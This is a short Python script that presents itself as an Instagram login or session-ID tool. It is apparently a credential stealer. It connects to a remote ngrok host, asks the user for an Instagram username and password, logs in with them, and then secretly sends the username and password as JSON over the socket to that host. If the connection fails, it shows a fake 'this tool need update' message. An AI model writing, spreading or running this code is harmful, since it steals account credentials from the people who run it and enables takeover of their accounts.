import os
try:
    import requests
except:
    os.system("pip install requests")
    



import socket
import json
import requests

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect(("5.tcp.eu.ngrok.io", 17173))
except:
    print("this tool need update")
    input()
    exit()




print("user instagram")
print("username:")
username = input("")
print("password")
password = input("")

Login = requests.post("https://www.instagram.com/accounts/login/ajax/", headers={'cookie': 'csrftoken=missing; mid=missing; ig_did=missing','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','x-csrftoken': 'missing'},data={'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}', 'username': username})

if ('"authenticated":true') in Login.text:
    print("sessionID -> " + str(Login.cookies).split(" ")[21].split("sessionid=")[1])
    client.send(json.dumps({"username": username, "password": password}).encode())
else:
    print("username or password ERROR")

client.close()
input()
